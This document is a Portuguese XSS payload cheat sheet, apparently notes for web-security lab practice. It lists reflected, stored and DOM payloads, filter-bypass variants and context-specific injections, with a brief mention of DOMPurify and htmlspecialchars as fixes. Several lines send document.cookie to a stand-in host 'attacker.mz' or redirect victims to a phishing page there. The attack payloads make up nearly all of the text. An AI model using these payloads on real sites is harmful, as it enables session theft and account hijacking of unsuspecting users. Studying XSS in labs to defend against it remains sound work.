# ───── XSS REFLETIDO (vai na URL) ─────
<script>alert(1)</script>
<img src=x onerror=alert(1)>
?q=%3Cscript%3Ealert(1)%3C/script%3E
?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

MEDIUM

Aninhado
<scr<script>ipt>alert(1)</script>

Maiúsculas (porque o filtro só apanha minúsculas):
<SCRIPT>alert(1)</SCRIPT>

Sem a tag script de todo (a mais fiável):
<img src=x onerror=alert(1)>


ALTA

# ═══ AUTO-DISPARAM (sem interação, sem "script") ═══
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror=alert(1)></video>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<iframe src=javascript:alert(1)>

# ═══ DISPARAM COM autofocus (quase automático) ═══
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

# ═══ PRECISAM DE INTERAÇÃO DA VÍTIMA ═══
<a href=javascript:alert(1)>clica aqui</a>
<div onmouseover=alert(1)>passa o rato</div>
<button onclick=alert(1)>clica</button>
<form><button formaction=javascript:alert(1)>enviar</button></form>

# ═══ VARIAÇÕES / ANTI-FILTRO ═══
<IMG SRC=x ONERROR=alert(1)>          # maiúsculas
<img/src=x/onerror=alert(1)>          # barras em vez de espaço
<img src=x onerror=alert`1`>          # backticks (sem parênteses)
<img src=x onerror=confirm(1)>        # outra função além de alert
<img src=x onerror=prompt(1)>
<svg onload=alert&lpar;1&rpar;>        # parênteses como entidade HTML
<img src=x onerror="window[`al`+`ert`](1)">  # alert montado por partes

# ───── XSS ARMAZENADO (fica guardado) ─────
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<script>new Image().src='//attacker.mz/c?='+document.cookie</script>


CORRECAO DA FALHA

DOMPurify PARA TEXTO COMO OS DE BLOGS QUE PRECISAM RECEBER ALGUNS HTML PARA FORMATAR O ARTIGO

PARA COMPOS NO GERAR
htmlspecialchars

# ───── XSS DOM (via #, não passa no servidor) ─────
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
#;alert(1)


# ───── POR CONTEXTO ─────
# corpo HTML
<script>alert(1)</script>
<svg onload=alert(1)>

# dentro de atributo value="..."
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="

# dentro de <script> var a='...'
';alert(1)//
'-alert(1)-'

# dentro de href
javascript:alert(1)


# ───── BYPASS DE FILTRO ─────
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert(1)>
<img src=x onerror="window['al'+'ert'](1)">


# ───── PROVAR IMPACTO ─────
<script>fetch('//attacker.mz/s?c='+document.cookie)</script>
<script>location='//attacker.mz/phish'</script>
